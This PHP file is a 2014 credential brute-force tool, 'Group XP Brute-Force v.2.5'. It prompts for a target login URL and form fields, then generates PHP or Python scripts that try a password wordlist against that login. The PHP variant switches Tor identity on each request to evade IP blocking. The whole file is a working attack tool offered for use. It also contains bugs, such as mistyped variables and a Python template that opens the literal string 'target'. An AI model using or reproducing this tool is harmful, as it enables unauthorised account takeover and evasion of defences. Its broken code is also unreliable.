<?php
/*
    
    
              ██████╗ ██████╗  ██████╗ ██╗   ██╗██████╗     ██╗  ██╗██████╗ 
             ██╔════╝ ██╔══██╗██╔═══██╗██║   ██║██╔══██╗    ╚██╗██╔╝██╔══██╗
             ██║  ███╗██████╔╝██║   ██║██║   ██║██████╔╝     ╚███╔╝ ██████╔╝
             ██║   ██║██╔══██╗██║   ██║██║   ██║██╔═══╝      ██╔██╗ ██╔═══╝ 
             ╚██████╔╝██║  ██║╚██████╔╝╚██████╔╝██║         ██╔╝ ██╗██║     
              ╚═════╝ ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝         ╚═╝  ╚═╝╚═╝ ALM3REFH.COM 
        
    Group XP Brute-Force v.2.5 © Group XP 2014
    
    Coder : Hannibal Ksa (@r00t3rz)
    Home  : alm3refh.com
    
    
    What's new in the 2.5 version ?
    - TOR auto-identity-switcher, in every request (in the PHP generated file only).
    
    
*/

class xp{
    
    #
    ###------------------------------###
    ## ُv.2.5 Version, yet its beta! ##
    ##     wait for the stable one    ##
    ###------------------------------###
    /*
    Note: it has no dynamic, thats why its a beta.
    */
    
    
    function bfphp($target,$firstvalue, $secondvalue, $extravalue = NULL, $type = "POST", $cookie = NULL, $success, $torip = NULL, $torport = NULL, $torauth = NULL){
        $data = "<?php \n # Generated by Group XP Brute-Force v.2.5\n\n";
        $data .="\nfunction xp(\$user, \$pass){";
        $data .="\n\$curl = curl_init(); ";
        if($type == "POST"){
            $data .="\ncurl_setopt(\$curl,CURLOPT_URL, \"$target\");";
        }elseif($type == "GET" && $extravalue != NULL){
            $data .="\ncurl_setopt(\$curl,CURLOPT_URL, \"$target/$firstvalue=\$user&$secondvalue=\$pass&$extravalue\");";
        }elseif($type == "GET" && $extravalue == NULL){
            $data .="\ncurl_setopt(\$curl,CURLOPT_URL, \"$target/$firstvalu=\$usere&$secondvalue=\$pass\");";
        }else{
            $data .="\ncurl_setopt(\$curl,CURLOPT_URL, $target);";
        }
        $data .="\ncurl_setopt(\$curl,CURLOPT_RETURNTRANSFER,1);";
        $data .="\ncurl_setopt(\$curl,CURLOPT_FOLLOWLOCATION,1);";
        if($torip != NULL && $torport != NULL){
            $data .="\ncurl_setopt(\$curl, CURLOPT_PROXY, '$torip:$torport');";
        }else{
            $data .="\n#curl_setopt(\$curl, CURLOPT_PROXY, 'TOR Proxy goes here :D'); -> change if needed";
        }
        if($cookie != NULL){
            $data .="\ncurl_setopt(\$curl,CURLOPT_COOKIEJAR, getcwd().\"./xp-cookie.txt\");";
            $data .="\ncurl_setopt(\$curl,CURLOPT_COOKIEFILE, getcwd().\"./xp-cookie.txt\");";
        }
        if($type != "GET" && $extravalue != NULL){
            $data .="\ncurl_setopt(\$curl,CURLOPT_POSTFIELDS, \"$firstvalue=\$user&$secondvalue=\$pass&$extravalue\");";
        }elseif($type != "GET" && $extravalue == NULL){
            $data .="\ncurl_setopt(\$curl,CURLOPT_POSTFIELDS, \"$firstvalue=\$user&$secondvalue=\$pass\");";
        }
        $data .="\n\$result = curl_exec(\$curl);";
        $data .="\nif(preg_match('#$success#', \$result)){";
        $data .="\n print \"\\n\\n\\t[!] Cracked \$target -> [ \$user:\$pass ]\\n\\n\";";
        $data .="\n #die();";
        $data .="\n} else {";
        $data .="\n   print \"\n[+] Trying \$user:\$password\";";
        if($torip != NULL && $torauth == NULL){
            $data .="\n   tor_new_identity('$torip', '$torport');";
        }elseif($torip != NULL && $torauth != NULL){
            $data .="\n   tor_new_identity('$torip', '$torport', '$torauth');";
        }elseif($type != "GET" && $extravalue == NULL){
            $data .="\n   #tor_new_identity('127.0.0.1', '9051', 'secret_password'); -> change if needed";
        }
        $data .="\n   #\$cookie = tor_get_cookie('/path/to/tor/data/dir/control_auth_cookie');  -> change if needed";
        $data .="\n   #tor_new_identity('$torip', '$torport', \$cookie);  -> change if needed";
        $data .="\n}";
        $data .="\n}";
        $data .="\nfunction tor_new_identity(\$tor_ip='127.0.0.1', \$control_port='9051', \$auth_code=''){";
        $data .="\n    \$fp = fsockopen(\$tor_ip, \$control_port, \$errno, \$errstr, 30);";
        $data .="\n    if (!\$fp) return false; //can't connect to the control port  ";
        $data .="\n    fputs(\$fp, \"AUTHENTICATE \$auth_code\\r\\n\");";
        $data .="\n    \$response = fread(\$fp, 1024);";
        $data .="\n    list(\$code, \$text) = explode(' ', \$response, 2);";
        $data .="\n    if (\$code != '250') return false; //authentication failed";
        $data .="\n    //send the request to for new identity";
        $data .="\n    fputs(\$fp, \"signal NEWNYM\\r\\n\");";
        $data .="\n    \$response = fread(\$fp, 1024);";
        $data .="\n    list(\$code, \$text) = explode(' ', \$response, 2);";
        $data .="\n    if (\$code != '250') return false; //signal failed";
        $data .="\n    fclose(\$fp);";
        $data .="\n    return true;";
        $data .="\n}";
        $data .="\nfunction tor_get_cookie(\$filename){";
        $data .="\n    \$cookie = file_get_contents(\$filename);";
        $data .="\n    //convert the cookie to hexadecimal";
        $data .="\n    \$hex = '';";
        $data .="\n    for (\$i=0;\$i<strlen(\$cookie);\$i++){";
        $data .="\n        \$h = dechex(ord(\$cookie[\$i]));";
        $data .="\n        \$hex .= str_pad(\$h, 2, '0', STR_PAD_LEFT);";
        $data .="\n    }";
        $data .="\n    return strtoupper(\$hex);";
        $data .="\n}";
        $data .="\nif(\$argc != 3){ die(\"\\n\\n[!] Usage: php \$argv[0] username list.txt\\n\\n\\n\"); }";
        $data .="\n\$user = \$argv[1];";
        $data .="\n\$list = \$argv[2];";
        $data .="\n\$file = file_get_contents(\$list);";
        $data .="\n\$passwords = explode(\"\\n\", \$file);";
        $data .="\nforeach(\$passwords as \$pass){ xp(\$user, \$pass); }";
        $data .="\nprint \"\\n\n\";";
        $data .="\n\n#CHEERS!";
        $rand = 'xp'.rand(4,8).'.php';
        $fp = fopen($rand, "w");
        $write = fputs($fp, $data);
        fclose($fp);
        print "\n\n\t[!] DONE -> $rand\n\n";
        }
    
    
        # Thnks to xSecurity (I used one of his python tools)
        function bfpython($target,$firstvalue, $secondvalue, $extravalue = NULL, $success){
        $data = "#!/usr/bin/python\n# Generated by Group XP Brute-Force v.2.5\nimport urllib ,urllib2 ,cookielib ,sys\nfrom time import sleep\nfrom threading import Thread\nprint '''\n++ Generated by Group XP Brute-Force v.2 ++\n           www.alm3refh.com\n'''";
        $data .="\nusr = raw_input(\"[*] Username: \")\nlst = raw_input(\"[*] Passlist: \")";
        $data .="\ndef brute(usr,pwd):";
        $data .="\n    cj = cookielib.CookieJar()";
        $data .="\n    ch = urllib2.HTTPCookieProcessor(cj)\n    opner = urllib2.build_opener(ch)\n    get = urllib2.urlopen('$target').read()";
        if($extravalue != NULL){
            $data .="\n    post = urllib.urlencode({\"$firstvalue\":usr, \"$secondvalue\":pwd, $extravalue})";
        }else{
            $data .="\n    post = urllib.urlencode({\"$firstvalue\":usr, \"$secondvalue\":pwd})";
        }
        $data .="\n    xp = opner.open('target',post).read()\n    if '$success' in xp:";
        $data .="\n        print '[!] Cracked: '+usr+':'+pwd";
        $data .="\n        sys.exit()";
        $data .="\n    else:";
        $data .="\n        print '[+] Trying: '+pwd";
        $data .="\nthreadlist = []";
        $data .="\nlist = open(lst,'r').read().split(\"\\n\")";
        $data .="\nfor pwd in list:";
        $data .="\n    t = Thread(target=brute, args=(url,usr,pwd))";
        $data .="\n    t.start()";
        $data .="\n    threadlist.append(t)";
        $data .="\n    sleep(0.009)";
        $data .="\nfor b in threadlist:";
        $data .="\n    b.join()";
        $data .="\n#E0F";
        $data .="\n#alm3refh.com";
        $rand = 'xp'.rand(4,8).'.py';
        $fp = fopen($rand, "w");
        $write = fputs($fp, $data);
        fclose($fp);
        print "\n\n\t[!] DONE -> $rand\n\n";
        }
    
    # Thnks to NEODZ
    function cleanUrl($url){
        return preg_replace("#(https?)://(www\.)?(.*)/?#","$1://$3",$url);
    } 
    
    
}

$hk = new xp;
print "\n\n\t+----------------------------+\n";
print "\t| Group XP Brute-Force v.2.5 |\n";
print "\t|    2014 © ALM3REFH.com     |\n";
print "\t+----------------------------+\n\n\n";
print "\n\nTARGET: ";
$target = trim(fgets(STDIN));
$target = $hk->cleanUrl($target);
print "\n\nUSING GET-REQUEST ? [Y/n]: ";
$type = trim(fgets(STDIN));
$type = strtolower($type);
$yes = array("yes","y");
if(in_array($type, $yes)){ $type = "GET"; } else { $type = "POST"; print "\nWell, I guess I'm going to use POST then!\n\n"; }
print "\n\nUSING COOKIE [Y/n]: ";
$cookie = trim(fgets(STDIN));
$cookie = strtolower($cookie);
if(in_array($cookie, $yes)){ $cookie = "YES"; } else { $cookie = NULL; print "\nAlright, no cookies.\n\n"; }
print "\n\nWHAT IS THE TRUE RESULT [ex: success, logout, etc!]: ";
$success = trim(fgets(STDIN));
print "\n\nFIRST VALUE [ex: user, email, etc!]: ";
$first = trim(fgets(STDIN));
print "\n\nSECOND VALUE [ex: pass, password, etc!]: ";
$second = trim(fgets(STDIN));
print "\n\nIS THERE ANY EXTRA VALUE ? [Y/n]: ";
$extra = trim(fgets(STDIN));
$extra = strtolower($extra);
if(in_array($extra, $yes)){ 
    print "\n\nNAME [ex: submit, go, etc!]:";
    $exname = trim(fgets(STDIN));
    print "\n\nVALUE [ex: true, submit, etc!]: ";
    $exvalue = trim(fgets(STDIN));
    $extravaluephp = $exname."=".$exvalue;
    $extravaluepython = "\"".$exname."\":\"".$exvalue."\"";
    print "\n\nPython ? [Y/n]:";
    $lang = trim(fgets(STDIN));
    $lang = strtolower($lang);
    if(in_array($lang, $yes)){
        $hk->bfpython($target,$first, $second, $extravaluepython, $success);
        die();
    }else{
        print "\n\nYOU WANT TO USE TOR ? [Y/n]:";
        $tor = trim(fgets(STDIN));
        $tor = strtolower($tor);
        if(in_array($tor, $yes)){
            print "\n\nYOUR TOR IP-ADDRESS ? [ex: 127.0.0.1]: ";
            $torip = trim(fgets(STDIN));
            print "\n\nYOUR TOR PORT ? [ex: 9051]: ";
            $torport = trim(fgets(STDIN));
            print "\n\nANY AUTHORIZATION NEEDED ? [Y/n]: ";
            $torauthx = trim(fgets(STDIN));
            $torauthx = strtolower(STDIN);
            if(in_array($torauthx, $yes)){
                print "\n\nAUTHO CODE ? [ex: secret_passw0rd]: ";
                $torauth = trim(fgets(STDIN));
                $hk->bfphp($target, $first, $second, $extravaluephp, $type, $cookie, $success, $torip, $torport, $torauth);
                die();
            }else{
                $torauth = NULL;
                $hk->bfphp($target, $first, $second, $extravaluephp, $type, $cookie, $success, $torip, $torport, $torauth);
                die();
            }
        }else{
            $torip = NULL;
            $hk->bfphp($target, $first, $second, $extravaluephp, $type, $cookie, $success, $torip, $torport, $torauth);
            die();
        }
    }
}else{
    $extravalue = NULL;
    print "\n\nPython ? [Y/n]:";
    $lang = trim(fgets(STDIN));
    $lang = strtolower($lang);
    if(in_array($lang, $yes)){
        $hk->bfpython($target, $first, $second, $extravalue, $success);
        die();
    }else{
        print "\n\nYOU WANT TO USE TOR ? [Y/n]:";
        $tor = trim(fgets(STDIN));
        $tor = strtolower($tor);
        if(in_array($tor, $yes)){
            print "\n\nYOUR TOR IP-ADDRESS ? [ex: 127.0.0.1]: ";
            $torip = trim(fgets(STDIN));
            print "\n\nYOUR TOR PORT ? [ex: 9051]: ";
            $torport = trim(fgets(STDIN));
            print "\n\nANY AUTHORIZATION NEEDED ? [Y/n]: ";
            $torauthx = trim(fgets(STDIN));
            $torauthx = strtolower($torauthx);
            if(in_array($torauthx, $yes)){
                print "\n\nAUTHO CODE ? [ex: secret_passw0rd]: ";
                $torauth = trim(fgets(STDIN));
                $hk->bfphp($target, $first, $second, $extravalue, $type, $cookie, $success, $torip, $torport, $torauth);
                die();
            }else{
                $torauth = NULL;
                $hk->bfphp($target, $first, $second, $extravalue, $type, $cookie, $success, $torip, $torport, $torauth);
                die();
            }
        }else{
            $torip = NULL;
            $torauth = NULL;
            $torport = NULL;
            $hk->bfphp($target, $first, $second, $extravalue, $type, $cookie, $success, $torip, $torport, $torauth);
            die();
        }
        $hk->bfphp($target, $first, $second, $extravalue, $type, $cookie, $success);
        die();
    }
}
#E0F
?>
